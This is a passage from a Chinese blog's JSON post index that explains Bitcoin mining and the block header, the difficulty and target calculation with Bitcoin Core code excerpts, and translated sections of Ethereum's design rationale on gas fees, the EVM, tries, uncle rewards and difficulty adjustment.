矿工任务考虑到矿工记账的积极性，中本聪在比特币系统中，设计了两种奖励，一是区块奖励，初始为每挖到一个区块奖励50个比特币，每四年递减一次，到2040年左右发放完毕，总量约为2100万个，而这也是比特币系统产生新币的唯一来源。二是交易手续费，区块中所包含交易的所有交易手续费都归成功打包该区块的矿工所得，交易手续费的重要性随着区块奖励的减少会逐渐提升，最终完全取代区块奖励，成为比特币系统刺激矿工挖矿的唯一物质激励。那么矿工作为淘金者，都需要做哪些工作呢？要想成为比特币矿工，首先要加入比特币网络并与其他节点相连，建立连接后，还有如下任务要完成：1、同步区块链已有数据，监听新区块。比特币系统默认最长链作为系统主链，因此只有在已有最长链的基础上打包区块，才可能得到大家的认可。2、监听交易广播。监听网络上的交易广播，验证交易签名是否有效，是否存在双花，付款地址有没有足够的余额，验证通过，放入交易池。3、构建coinbase交易，组装新区块。coinbase交易为矿工自行构建，用以接收挖矿奖励。矿工应以全网最长链上的最后一个区块为基础构建新区块。4、找到让区块满足要求的随机数。工作量证明就体现在这一步，最为耗时。5、广播新区块。为了获得区块奖励和交易手续费，矿工在成功打包新区块后，会在第一时间向全网广播，因为网络延迟，所以存在相近时间不同矿工成功打包出不同区块的情况，这时便会出现软分叉，只有被大部分矿工所接受，新区块才算真正加入区块链。 区块头BlockHeader挖矿的本质是执行Hash函数，而Hash函数是一个单向函数，一个输入对应一个输出，根据输入可以很容易计算出输出，但根据输出无法逆推出输入。当输出小于目标值值，便可认为一次挖矿成功，而这里输入数据就是区块头。比特币的区块头有如下6个字段：123456int32_t nVersion; //版本号，4字节uint256 hashPrevBlock; //前一个区块的hash值，32字节uint256 hashMerkleRoot; //根据区块所包含交易构建的Merkle树根，32字节uint32_t nTime; //Uinx时间戳，4字节uint32_t nBits; //难度的压缩表示，4字节uint32_t nNonce; //随机数，4字节 比特币挖矿就是对区块头的80个字节进行两次SHA256运算，得到32字节的数据，使之满足nBits转化出来的目标值。可用如下公式表示：1SHA256(SHA256(nVersion+hashPrevBlock+hashMerkleRoot+nTime+nBits+nNonce))&lt;F(nBits) 关于区块头BlockHeader各字段的具体含义将在接下来的文章具体介绍。","categories":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}],"tags":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/tags/矿池/"},{"name":"LeonBCK","slug":"LeonBCK","permalink":"http://xingyunbite.github.com/tags/LeonBCK/"}],"keywords":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}]},{"title":"以太坊wiki-设计原理翻译四","slug":"以太坊wiki-设计原理翻译四","date":"2018-02-24T03:01:05.000Z","updated":"2018-03-09T09:32:59.581Z","comments":false,"path":"2018/02/24/以太坊wiki-设计原理翻译四/","link":"","permalink":"http://xingyunbite.github.com/2018/02/24/以太坊wiki-设计原理翻译四/","excerpt":"","text":"以太坊wiki-设计原理翻译三 燃料和手续费比特币中的交易大致相同，因此它们在网络上的成本可以抽象成一个模型，而以太坊中的交易则更复杂，交易费用系统需要考虑许多因素，包括带宽成本 ，存储成本和计算成本。特别重要的是，以太坊编程语言是图灵完备的，因此交易可以使用任意数量的带宽，存储和计算，并且因为不能提前可靠地预估暂停的问题，算力可能被大量使用。所以防止通过无限循环进行的拒绝服务攻击是一个关键目标。 交易手续费的基本机制如下： 每笔交易都需要指定一定数量愿意被花费的燃料（被称作 startgas），以及愿意为每单位燃料支付的价格（gasprice）。在执行之初，startgas * gasprice 这么多的 ether 会从交易发送者的账户中被扣除。 交易执行期间的所有操作，包括数据库的读写，消息，和虚拟机中的每个计算步骤，都会消耗一定数量的燃料。 如果一笔交易执行被完整地处理，消耗的燃料比它限定的燃料少，那么该剩余的燃料被称作 gas_rem。一笔交易首先会正常执行，然后在交易执行的最后，交易发送者会收到一笔退款 gas_rem * gasprice，矿工会收到一笔 (startgas - gas_rem) * gasprice 的奖励。 如果在交易执行过程中，燃料耗尽，那么所有的执行都会被回滚，而交易也依旧未被验证。该交易的唯一影响是 startgas * gasprice 会被转给矿工。 当一个合约发送一个消息给另一个合约，它也可以设置一个燃料限定值来指定由该消息引起的子执行操作。如果该执行耗尽燃料，那么一切回滚，而燃料也会被消耗。 以上的每个部分都是必要的。例如： 如果交易不需要指定燃料限制，那么恶意用户可以发送一笔进行数十亿循环的交易，因为处理这样的交易将花费比块间隔更长的时间，所以没有人能够处理它， 但矿工们无法预知该交易的存在，那么就会导致拒绝服务漏洞。 将时间限制替代燃料限制，并不会起作用，因为这太主观了（有些机器比其他机器更快，甚至在相同的机器中也总是存在闭合调用）。 整个值 startgas * gasprice 必须在开始时即作为押金取出，这样就不会出现账户在执行中“破产”并且无法支付燃料的情况。 请注意，余额检查是不够的，因为帐户可以在其他地方发送余额。 如果在燃料不足的错误下，执行没有回滚，那么合约就需要采取强有力但是困难的安全措施，以防止自身被交易或消息利用而提供只能运行到一半的燃料，从而导致当前正在执行的合约发生一些变化。 如果子限制不存在，那么敌对账户可以通过与其签订协议来制定对其他合同的拒绝服务攻击，然后在计算开始时插入无限循环，这样受害者合约中的任何企图补偿攻击合约（any attempts by the victim contract to compensate the attack contract）或向其发送消息的行为都会使整个交易执行陷于瘫痪。 要求交易发送者支付燃料而不是合约来支付，大大提高了开发者的可用性。以太坊的早期版本有支付燃料的合约，但是这导致了一个相当丑的问题，即每个合约都必须实施“守卫”代码，以确保每一个传入的消息都足以补偿合约以足以支付燃料的消耗。 注意燃料消耗的特定的特性： 21000 单位的燃料是一笔交易的基本手续费。这涵盖了从签名中恢复发件人地址以及存储交易的空间和带宽空间的椭圆曲线操作的成本。 一笔交易可以包括无限的数据，虚拟机提供了操作码使得合约接受交易来访问数据。固定燃料手续费为，每个 0 字节 4 单位燃料，每个非 0 字节 68 单位燃料。这个公式是因为我们注意到用户写的合约中的大多数交易数据都被组织成一系列 32 字节的参数，其中大部分都有前导 0 字节，虽然这样的构造看起来似乎没有效率，但是由于压缩算法的存在，这样反而十分有效率，我们希望鼓励使用它们来代替更复杂的机制，以便根据预期的字节数来压缩参数，从而在编译器级别增加复杂性。这是三明治复杂性模型的一个例外，但是由于成本与收益的比例，这是合理的。 SSTORE 操作符会在账户的存储空间中设置变量，它的消耗如下：(i) 将一个为零的变量改为非零时，为 20000 单位的燃料，(ii) 将一个零变量改为零变量，将一个非零变量改为非零变量时，为 5000 单位燃料，(iii) 将非零变量改为零变量时，为 5000 单位燃料，加上在成功交易执行结束时提供的 20000 单位燃料退款。（plus a 20000 gas refund to be given at the end of successful transaction execution）（即不是执行导致的燃料耗尽异常）。退款最高为交易花费的全部燃料的一半。这提供了一个小小的激励来清空存储空间，因为我们注意到，没有这样的激励的话，很多合约都会留下一些未使用的存储空间，导致快速膨胀增加体积，为存储“收取租金”提供了很多好处，同时也没有风险，一个被放置好的合同将永远存在。延迟退款机制对于防止拒绝服务攻击是必要的，攻击者会发送具有少量燃料的交易，在一个运行很长时间的循环中频繁清空大量的存储空间，这样会很快耗尽燃料，也会消耗验证者大量的算力，但这个操作实际上却并没有清空存储空间或者花费大量的燃料。50% 的上限是为了确保一个矿工在获得具有一定数量燃料的交易后仍然可以确定执行交易的计算时间的上限。 合约提供的消息中的数据不会消耗燃料。这是因为在消息调用期间不需要真正“复制”任何数据，因为调用数据可以简单地看作是指向父合约的内存的指针，它在子进程执行期间不会改变。 内存是一个无限可扩展的阵列。 但是，每 32 字节的内存扩展会消耗一个单位的燃料，这里会四舍五入。 一些计算时间高度依赖于参数的操作码，拥有不同的燃料消耗值。比如，指数的燃料消耗为 10 加上指数中的每字节的 10 单位（即 x^0 = 1 燃料，x^1…x^255 = 2 燃料，x^256…x^65535 = 3 燃料 等等），而复制操作码（CALLDATACOPY, CODECOPY, EXTCODECOPY）的燃料消耗为 1 加上每 32 字节的一单位燃料，这里四舍五入（LOG 拥有类似的规则）。内存膨胀的燃料成本不足以弥补这一缺陷，因为它打开了一次二次攻击（50000 轮的 50000 单位燃料的 CALLDATACOPY 约为 50000 ^ 2 的计算量，但在引入可变燃料成本之前只有约 50000 单位燃料） 如果值非零，那么CALL 操作码（和对称的 CALLCODE）花费额外的 9000 单位燃料。这是因为任意值转移都会导致存档节点的历史存储空间严重膨胀。注意，实际的手续费为 6700；在这之上我们强制增加了一个最低为 2300 单位的燃料用来自动给收据。这是为了确保收到交易的钱包至少有足额的燃料来记录该交易。 燃料机制的另一个重要的部分是燃料价格本身的经济性。比特币中使用的默认方法是完全自愿的手续费，依靠矿工设置动态的最低值来扮演一个守门人的角色；与之相对的，在以太坊中，允许交易发送者设置任意的燃料消耗。这种方式在比特币社区中十分受欢迎，因为它是基于市场的，允许矿工和交易发送者之间的供需关系决定价格。然而这里存在一个问题，交易处理并不是市场；尽管将交易处理作为矿工提供给发送方的服务具有直接的吸引力，但实际上，矿工打包的每笔交易都需要被网络上的每个节点处理，因此绝大多数交易处理成本由第三方承担，而不是决定是否打包该交易的矿工。因此，很可能会发生普遍灾难（tragedy-of-the-commons）的问题。 目前，由于缺少关于矿工实际上是如何处理的详细信息，我们实施了一个相当简单的方法：一个投票系统。矿工拥有权力对当前的区块设置燃料限制，该限制与上一个区块的燃料限制可以有大约 0.0975%（1/1024）的浮动，因此产生的燃料限制应该为矿工偏好的中位数。我们希望将来能够将其分解为更精确的算法。 虚拟机以太坊虚拟机是交易码执行的引擎，也是以太坊和其他系统不同的核心特性。注意，将 虚拟机 和 合约 与 消息模型 分别看待，比如， SIGNEXTEND 操作码是虚拟机的一个特性，而合约可以调用其他合约，指定子调用的燃料限制是合约和消息的一部分。以太坊虚拟机的设计目的包括： 简单：尽可能少的底层操作码，尽可能少的数据类型，以及尽可能少的虚拟机层次的结构。 完全明确：在虚拟机的说明中绝对不允许存在模棱两可的情况，并且结果必须是完全确定的。另外，应该有一个精确的计算步骤的概念，可以测量计算燃料的消耗。 节省空间：以太坊虚拟机组件应尽可能紧凑（例如，默认 C 程序的 4000 字节基本大小是不可接受的）。 期望的应用的专业能力（Specialization to expected applications）：有能力处理 20 字节地址 和自定义的32 字节变量的加密，自定义加密中的模块化算法，读取区块和交易数据，与状态交互等等。 简单的安全：应该很容易就能够想出操作符的燃料消耗模型，该模型使得虚拟机无法被利用。 优化友好：应该很容易优化，以便可以构建 JIT 编译的和其他速度更快的 VM 版本。 一些特殊的设计决定如下： 临时/永久存储的区别 - 存在于虚拟机的每个实例内并在虚拟机执行完成时消失的临时存储与基于每个账户的存在于区块链状态级别上的永久存储之间存在区别。比如，假设执行下列执行树（使用 S 代表永久存储，M 代表临时存储）：（i） A 调用 B，（ii） B 设置 B.S[0] = 5，B.M[0] = 9，（iii） B 调用 C，（iv）C 调用 B。在此时，如果 B 树读取 B.S[0]，它会获取到之前存储在 B 中的值，但是 B 树读取 B.M[0]，它回返回 0，因为在虚拟机的临时存储中这个一个新的实例。如果 B 在这个内部调用中设置 B.M[0] = 13 和 B.S[0] = 17，然后这个内部调用和 C 的调用终止，使得执行回到 B 的外部调用，然后 B 读取 M，将会看到 B.M[0] = 9(自上次设置此值在同一个 VM 执行实例中) 和 B.S[0] = 17。如果 B 的外部调用终止，A 再次调用 B，然后 B 会看到 B.M[0] = 0 和 B.S[0] = 17。这种区别的目的是（1）为每个执行实例提供自己的内存，这些内存不会受到递归调用的破坏，使安全编程变得更加容易，并且（2）提供一种可以非常快地操作的内存形式， 因为需要修改树，所以存储更新的速度一定很慢。 栈/内存模型 - 早期做出的决定有三种计算状态（除了指向下一条指令的程序计数器外）：栈（一种标准的先进后出的 32 字节变量栈），内存（一种无限可扩展的临时字节数组）和存储（永久存储）。在临时存储方面，堆栈和内存的替代方案是一个仅限内存的范例，或者是寄存器和内存的混合（不是很不相同，因为从根本上说寄存器也是一种内存）。在这个例子中，每个命令会有三个参数，如 ADD R1 R2 R3:M[R1] = M[R2] + M[R3]。选择堆栈范例的原因很明显，它使代码缩小了四倍。 32 字节字大小 - 与其他大多数架构一样，替代方案是 4 或 8 个字节的字，或者像比特币一样是无限的字。4 字节或 8 字节字太严格，无法存储加密计算的地址和很大的值，而无限的值则很难根据其建立一个安全的燃料模型。32 字节是理想的，因为它足够大以存储许多加密实现中常见的 32 字节值，以及地址（并提供将地址和值打包到单个存储索引中的优化能力），但又不会太大以至于效率变得极低。 拥有我们自己的虚拟机 - 替代方案是使用 Java，或者一些 Lisp dialect，或者 Lua。我们认为拥有一个专门的虚拟机是合适的，因为（i）我们的虚拟机规格比许多其他虚拟机简单得多，因为其他虚拟机必须为复杂性付出更低的成本，而在我们的情况下，每次增加复杂性都是朝着创建开发集中化和可能存在包括共识失败的安全漏洞这样的高门槛迈出的一步（whereas in our case every additional unit of complexity is a step toward high barriers of entry creating development centralization and potential for security flaws including consensus failures,），（ii）它使我们能够更专业化虚拟机，例如，通过具有 32 字节的字大小，（iii）它使我们不会有非常复杂的可能导致安装困难的外部依赖性，以及（iv）针对以太坊的特殊安全需求的安全审查，无论如何都需要对外部虚拟机进行安全审查，因此节省的工作量并不大。 使用可变的可扩展内存大小 - 我们认为，如果规模很小，或者规模很大，都没有必要限定一个固定的内存大小，并且注意如果内存访问的语句在任何情况下都需要检查越界访问，那么固定大小就不会使执行效率更高。 不限制堆栈大小 - 没有任何特别的理由; 请注意，在许多情况下，限制并非绝对必要，因为燃料消耗和区块级燃料限制的组合总是作为每种资源消耗的上限。 有一个 1024 层级深度的调用限制 - 许多编程语言在很高的堆栈深度时会比在很高的内存使用率或计算负载时突然崩溃的速度快得多，因此区块燃料限制的隐含限制可能不足。 没有类型 - 为了简单。相反，取而代之的是使用有符号或无符号的操作码如 DIV, SDIV, MOD, SMOD（事实证明，对于 ADD 和 MUL，有符号和无符号操作码的行为是等同的），以及定点数运算（高深度定点运算是 32 字节字的另一个好处）在任何情况下都很简单，如 32 位深度，a * b -&gt; (a * b) / 2^32，a / b -&gt; a * 2^32 / b 以及 +，- 和 * 在整数情况下保持不变。 虚拟机中的一些方法和操作码的目的是显而易见的，但也不全是。一些特殊解释给出如下： ADDMOD, MULMOD：在大多数情况下，addmod(a, b, c) = a * b % c。然而，在许多类椭圆曲线密码学的特定情况下，使用 32 字节模块化算术，因此直接做 a * b % c 实际上是 ((a * b) % 2 ^ 256) % c，这就是一个完全不同的结果。在 32 字节的空间中使用 32 字节的值计算 a * b % c 的公式是十分普通和臃肿的。 SIGNEXTEND：SIGNEXTEND 的目的是促进从更大的有符号整数到更小的有符号整数的类型转换。 小的带符号整数很有用，因为 JIT 编译的虚拟机将来可以检测长时间运行的代码块，这些代码块主要处理 32 字节整数，并大大加快速度。 SHA3： SHA3 在以太坊代码中十分使用，因为使用存储的安全无限大小散列映射可能需要使用安全散列函数，以防止恶意冲突，以及验证默克尔树，甚至是验证类以太坊的数据结构。一个关键点是它的朋友 SHA256，ECRECOVER 和 RIPEMD160不是作为操作码而是伪协议被包含其中。这样做的目的是将它们放入一个单独的类别中，以便在之后我们提出适当的“本机扩展”系统时，可以添加更多此类合约而不是填充操作码的空间。 ORIGIN：提供交易发送人的 ORIGIN 操作码的主要用途是允许合约对燃料进行退款支付。 COINBASE：COINBASE 操作码的主要用途是（i）允许子货币选择为网络安全做出贡献;以及（ii）开放矿工的使用权，作为分布式经济集合，用于基于次级共识的应用程序，如 Schellingcoin。 PREVHASH：用作半安全随机源，并允许合约评估前一个区块中 Merkle 树状态的树状证明，而不需要高度复杂的递归“以太坊中的以太坊轻客户端”构造。 EXTCODESIZE, EXTCODECOPY：这里的主要用途是允许合约在与其他合约进行交互之前，根据模板检查其他合约的代码，甚至模拟它们。见应用的http://lesswrong.com/lw/aq9/decision_theories_a_less_wrong_primer/ JUMPDEST：JIT 编译的虚拟机在跳转目标受限于几个索引时变得更容易实现（具体的说，可变目标跳转的计算复杂度大致为 O(log(有效跳转目标的数量))，尽管静态跳转总是常量时间）。因此，我们需要（i）对有效变量跳转目标的限制，（ii）激励使用静态跳转。为了达到这些目的，我们有以下规则（i）在被推送紧接着的跳转可以跳转到任意地方，但是不能跳转到另一个跳转，（ii）其他跳转尽能跳到 JUMPDEST。限制跳转到跳转是必要的，这样查看一个跳转是动态还是静态的可以很容易的根据代码中在它之前的操作判断。对静态跳转缺乏 JUMPDEST 操作的需求是使用它们的动机。禁止跳入推送数据也会加速 JIT VM 的编译和执行。 LOG：LOG 表示记录事件，可见上面树的使用部分。 CALLCODE：这个操作符的目的是允许合约以存储在其他合约中的代码的形式调用“函数”，这样具有单独的堆栈和内存，但是使用该合约自己的存储。这使得在区块链上可扩展地实现代码的“标准库”变得更加容易。 SELFDESTRUCT：如果不再需要一个合约可以通过此操作符来销毁该合约。SELFDESTRUCT 在交易执行结束时被处理，而不是立即处理，这是因为拥有回滚早已执行的 SELFDESTRUCT 的能力会大大增加一个高效的虚拟机实现中所需的高速缓存的复杂度。 PC：尽管在理论上不是必需的，因为 PC 操作码的所有实例都可以通过简单地将实际的程序计数器放在该索引处作为推动来替换，使用代码中的 PC 允许创建与位置无关的代码（即编译的可复制/粘贴到其他合同中的函数，并且如果它们以不同的索引结束就不会中断）。","categories":[{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/categories/区块链/"}],"tags":[{"name":"ZhouFyk","slug":"ZhouFyk","permalink":"http://xingyunbite.github.com/tags/ZhouFyk/"},{"name":"以太坊","slug":"以太坊","permalink":"http://xingyunbite.github.com/tags/以太坊/"},{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/tags/区块链/"}],"keywords":[{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/categories/区块链/"}]},{"title":"以太坊wiki-设计原理翻译三","slug":"以太坊wiki-设计原理翻译三","date":"2018-02-24T02:39:17.000Z","updated":"2018-03-09T09:32:59.581Z","comments":false,"path":"2018/02/24/以太坊wiki-设计原理翻译三/","link":"","permalink":"http://xingyunbite.github.com/2018/02/24/以太坊wiki-设计原理翻译三/","excerpt":"","text":"以太坊wiki-设计原理翻译二 树的使用方式警告：本节内容假设你已经了解了布隆过滤器是如何工作的。详情可见:http://en.wikipedia.org/wiki/Bloom_filter 以太坊区块链中的每个区块都包含了 3 个指针指向 3 个 树：状态树（the state trie），代表连接区块之后的全部状态，交易树，代表区块中索引关联的所有交易（即 key 0:第一笔要执行的交易，key 1:第二笔要执行的交易，等等），以及收据树，代表了符合每笔交易的收据（receipts）。对应于一笔交易的收据是一个经过 RLP 编码的数据结构： [ medstate, gas_used, logbloom, logs ] 对应的： medstate 是处理交易之后的状态树的根。 gas_used 是处理该笔交易之后消耗的燃料数量。 logs 是交易执行过程中由 LOG0 ... LOG4 操作码生成的 [address, [topic1, topic2...], data]形式的项目列表（包括主调用和次调用）。address 是产生日志的合约的地址，topics 最多为 4 个 32 字节值，data 是任意大小的字节数组。 logbloom 是交易中所有的日志的 topics 和地址组成的布隆过滤器。 区块头中也有一个布隆（bloom），它是区块中所有交易的布隆的“或”结果。这个结构的目的是使以太坊的轻客户端尽可能的友好。更多以太坊轻客户端和它们的使用实例，见:light client page (principles section)。 叔块激励“贪婪的最重观察子树（Greedy Heaviest Observed Subtree）”（GHOST）协议是 Yonatan Sompolinsky 和 Aviv Zohar 于 2013 年 12 月首次推出的一项创新，也是第一次有人认真尝试解决“阻塞越来越快”的问题。GHOST 背后的动机是，目前区块链通过最快确认次数来确认区块的方案，由于过高的陈旧率而降低了安全性 - 因为区块在网络中传播需要一定的时间，如果矿工 A 挖出一个块，然后在矿工 A 的块传播到 B 之前矿工 B 恰巧挖出另一个块 ，矿工 B 的块将会浪费掉（“陈旧”），并且对于网络安全没有任何帮助。此外，还有一个集中化问题：如果矿工 A 是一个拥有3 0％ 算力的矿池，而 B 拥有 10％ 的算力，那么 A 将有 70％ 的时间产生陈旧块的风险（因为另外 30％ 的时间 A 产生了最后一个块，因此将立即获取挖掘数据），而 B 将有 90％ 的时间产生陈旧块的风险。因此，如果区块间隔足够短而导致陈旧率较高，那么凭借其算力，明显地，A 将更高效。将这两种效应结合起来，快速生成区块的区块链很可能导致一个具有足够算力的矿池对挖矿产生垄断。 正如 Sompolinsky 和 Zohar 所描述的那样，GHOST 通过在计算哪个链是“最长”时包含陈旧块来解决网络安全损失的第一个问题; 也就是说，在计算最长链的工作量证明中，除了该区块的直系祖先区块，还包含了该区块之前被废弃的叔块。 为了解决可能的中心化问题，我们采用了一个不同的策略：我们对叔块进行奖励：一个叔块会获得它的基本奖励的 7/8(87.5%)，而该叔块的下一个区块会获得基本奖励的 1/32(3.125%)。当然交易费不会作为奖励。 在以太坊中，一个陈旧的块只能被当做一个叔块，然后从它的兄弟区块往下最多被直系区块包含 7 代，除此之外叔块和其他任何区块都没有关系。这么做的原因如下：首先，不受限制的 GHOST 会在计算哪个叔块对于当前的区块是合法的时候出现大量的困难。其次，在以太坊中使用无限制的叔块激励，会导致矿工对于是否在主链挖矿不再关心，而这可能导致主链被公共攻击。最后，计算表明，限制到七个级别时利大于弊。 这里有一个可用的衡量集中化风险的仿真器:https://github.com/ethereum/economic-modeling/blob/master/ghost.py 一个更高级的讨论:https://blog.ethereum.org/2014/07/11/toward-a-12-second-block-time/ 我们的区块时间算法中的设计决定包含： 12 秒出块时间：选择 12 秒作为尽可能快的时间，但同时比网络等待时间长得多。2013年，Decker和Wattenhofer在苏黎世的一篇文章测量了比特币的网络延迟，并确定了 12.6 秒是一个新块传播到95％的节点所花费的时间。然而，论文还指出，大部分的传播时间与块的大小成正比，因此越快的货币传播时间越少（in a faster currency we can expect the propagation time to be drastically reduced）。传播间隔的恒定部分约为 2 秒，但是，为了安全起见，我们假设块在我们的分析中需要 12 秒才能传播。 7 个区块祖先限制：这是一个设计目标的一部分，希望在块数很少的情况下很快就可以使块的历史被“遗忘”，并且已经证明 7 块已经提供了大部分预期的效果。 一个区块后代限制（如，c(c(p(p(p(head)))))，其中 c = child，p = parent，是不合法的）：这是简洁的设计目标的一部分，上面的模拟器显示它不会带来很大的集中化风险。 叔块验证要求：叔块必须包含一个有效的头部，而不是区块。这是为了简单起见，并将区块链模型保持为线性数据结构（而不是 Sompolinsky 和 Zohar 的新模型中的块 DAG）。 要求叔块的块合法也是一个有效的方法。 难度调整算法以太坊目前的难度调整规则如下： 12345diff(genesis) = 2^32diff(block) = diff.block.parent + floor(diff.block.parent / 1024) * 1 if block.timestamp - block.parent.timestamp &lt; 9 else -1 if block.timestamp - block.parent.timestamp &gt;= 9 难度调整规则的设计目标是： 快速更新：区块之间的时间的调整要快。 稳定：如果算力不变，难度不应该过大。 简单：算法实现要简单。 占用内存低：算法不应依赖太多历史区块，并尽可能少地使用内存。假设最后十个块，加上最后十个块的块头中的所有内存变量，这就足够算法运行了。 非开发性：该算法不应该过度鼓励矿工修改时间戳，或者矿池频繁地增加和移除算力，以试图最大化他们的收入。 我们已经确定，我们目前的算法在稳定性和不可利用性方面非常不理想，然后我们打算至少将时间戳相对于父母和祖父母进行切换，这样当矿工挖矿时，他们只会修改时间戳。另一个更强大的仿真器公式位于https://github.com/ethereum/economic-modeling/blob/master/diffadjust/blkdiff.p（仿真器使用比特币的挖矿能力，但只使用当天的均值;它在一天的时间内，在某个点模拟 95% 的崩溃）。","categories":[{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/categories/区块链/"}],"tags":[{"name":"ZhouFyk","slug":"ZhouFyk","permalink":"http://xingyunbite.github.com/tags/ZhouFyk/"},{"name":"以太坊","slug":"以太坊","permalink":"http://xingyunbite.github.com/tags/以太坊/"},{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/tags/区块链/"}],"keywords":[{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/categories/区块链/"}]},{"title":"比特币挖矿之全网难度","slug":"比特币挖矿之全网难度","date":"2018-02-09T04:24:39.000Z","updated":"2018-03-09T09:32:59.585Z","comments":false,"path":"2018/02/09/比特币挖矿之全网难度/","link":"","permalink":"http://xingyunbite.github.com/2018/02/09/比特币挖矿之全网难度/","excerpt":"","text":"2018年2月7日，比特币全网难度再次提升10.43%，而这对于正经历币价大跌的矿工来说，挖矿难度的提升，意味着挖矿收益进一步下降。那么在比特币系统中，挖矿难度究竟是如何调整的呢？ 目标值（target）上文中提到，矿工在打包区块的时候，合格的区块应该满足:1SHA256(SHA256(BlockHeader))&lt;target 在比特币系统中，target是使用区块头中的nBits字段来标识的。nBits使用压缩表示机制来存储当前目标值，其中nBits的前两位十六进制数字为幂(bits_exponent),后六位为系数(bits_coefficient)，nBits可以通过如下运算，得到target。1target = bits_coefficient * 2^(8 * (bits_exponent-3)) 以508230区块为例，此区块对应的bits为0x1761e9f8123target = 0x61e9f8 *2^(0x08*(0x17-3)) = 0x61e9f8 *2^(0x08*0x14) = 0x61e9f8 *2^0xA0 按十进制计算为:1target = 6,416,888 * 2^160 转换为十六进制后为:1target =0x00000000000000000061e9f80000000000000000000000000000000000000000 而记录到区块链上的该高度对应的区块头的hash值为0000000000000000003692a92ed937e4e0a5f247e27feeeb4df383e6d9c2bd94,满足要求。 难度（difficulty）难度（difficulty）是对挖矿困难程度的度量，创世区块的difficulty为1。需要注意的是，difficulty并没有记录在区块头中，而是通过nBits计算得到的。具体实现如下：12345678910111213141516171819202122232425262728double GetDifficulty(const CBlockIndex* blockindex)&#123; if (blockindex == NULL) &#123; if (chainActive.Tip() == NULL) return 1.0; else blockindex = chainActive.Tip(); &#125; int nShift = (blockindex-&gt;nBits &gt;&gt; 24) &amp; 0xff; double dDiff = (double)0x0000ffff / (double)(blockindex-&gt;nBits &amp;0x00ffffff); while (nShift &lt; 29) &#123; dDiff *= 256.0; nShift++; &#125; while (nShift &gt; 29) &#123; dDiff /= 256.0; nShift--; &#125; return dDiff;&#125; 创世区块的bits值为0x1d00ffff，代入上述方法中，nShift=29,dDiff=1,可得创世区块的difficulty为1。根据上面目标值target的计算公式可得创世区块的target为:0x00000000ffff0000000000000000000000000000000000000000000000000000。根据难度调整机制（参见下文），我们可以知道，高度为1的区块的target也为0x00000000ffff0000000000000000000000000000000000000000000000000000，也就是说，为了构建出高度为1的合法区块，矿工需要不断对区块头做双SHA256运算，直到找到一个区块头的Hash值的前32位均为0，而SHA256运算结果在某一位上的值可以认为是随机的，也就是平均要做2^32次运算，才能找到问题的解。上述GetDifficulty方法表现的nBits与Difficulty的关系可转化为target与Difficulty:1difficulty = difficulty_1_target/current_target 其中difficulty表示最新区块的挖矿难度，difficulty_1_target表示难度为1的区块的目标值，也可以理解为创世区块的目标值，current_target表示最新区块的目标值。从上述公式我们可以看出，难度与目标值成反比关系，目标值越小，难度越大，矿工平均需要运算的次数也就越大。同样以508230区块为例:1234difficulty = 0x00000000FFFF0000000000000000000000000000000000000000000000000000 / 0x00000000000000000061e9f80000000000000000000000000000000000000000 = 2.87 * 10^12 = 2.87 T 难度调整上面提到，比特币的挖矿难度是可调整的，那么这个难度为什么需要调整？由谁来调整？如何调整？ 比特币系统平均每10分钟生成一个区块，而全网的算力是变化的，为了应对全网算力可能在一定时间内发生暴增或者骤减的情况，保持每10分钟产生一个新区块的产生速率，比特币采用这样一种难度调整机制:每2016个区块，所有节点调整一次难度，难度的调整公式可表示如下：1New Difficulty = Old Difficulty * (Actual Time of Last 2016 Blocks / 20160 minutes) 通过上述公式，比特币系统便能实现当区块产生速率比10分钟要快时，增加难度。如果发现比10分钟慢时，则降低难度。当然这种调整无法及时应对币价暴跌导致全网算力骤减的情况。 在矿工每次打包新的区块的时候，会对下一个区块的高度进行判断1、当高度不是2016的倍数时，会直接返回上一个区块的bit2、当高度是2016的倍数时，会根据上面提到的难度调整公式进行计算。具体代码实现如下：12345678910111213141516171819202122232425unsigned int CalculateNextWorkRequired(const CBlockIndex* pindexLast, int64_t nFirstBlockTime, const Consensus::Params&amp; params)&#123; if (params.fPowNoRetargeting) return pindexLast-&gt;nBits; // Limit adjustment step int64_t nActualTimespan = pindexLast-&gt;GetBlockTime() - nFirstBlockTime; if (nActualTimespan &lt; params.nPowTargetTimespan/4) nActualTimespan = params.nPowTargetTimespan/4; if (nActualTimespan &gt; params.nPowTargetTimespan*4) nActualTimespan = params.nPowTargetTimespan*4; // Retarget const arith_uint256 bnPowLimit = UintToArith256(params.powLimit); arith_uint256 bnNew; bnNew.SetCompact(pindexLast-&gt;nBits); bnNew *= nActualTimespan; bnNew /= params.nPowTargetTimespan; if (bnNew &gt; bnPowLimit) bnNew = bnPowLimit; return bnNew.GetCompact(); &#125;&#125; 为了防止难度的变化过快，每隔周期的调整幅度必须有一定的限制。如果调整幅度大于4倍，则按4倍调整，因此当难度变化过快时，可能要经过几个2016区块周期才会完成。","categories":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}],"tags":[{"name":"LeonBCK","slug":"LeonBCK","permalink":"http://xingyunbite.github.com/tags/LeonBCK/"},{"name":"比特币","slug":"比特币","permalink":"http://xingyunbite.github.com/tags/比特币/"},{"name":"bitcoin","slug":"bitcoin","permalink":"http://xingyunbite.github.com/tags/bitcoin/"}],"keywords":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}]},{"title":"以太坊wiki-设计原理翻译一","slug":"以太坊wiki-设计原理翻译一","date":"2018-02-09T03:22:26.000Z","updated":"2018-03-09T09:32:59.581Z","comments":false,"path":"2018/02/09/以太坊wiki-设计原理翻译一/","link":"","permalink":"http://xingyunbite.github.com/2018/02/09/以太坊wiki-设计原理翻译一/","excerpt":"","text":"设计原理原文链接尽管以太坊借鉴了许多已经在比特币这样的老式加密货币中经过了5年的尝试和测试的想法，但是以太坊在处理某些协议特征方面与常见方式有很多不同之处，因为目前现存的系统中没有以太坊需要的功能，所以以太坊另外开发了全新的功能。本文档的目的是详细说明在制定以太坊协议过程中所做出的所有可能不明显的或有些有争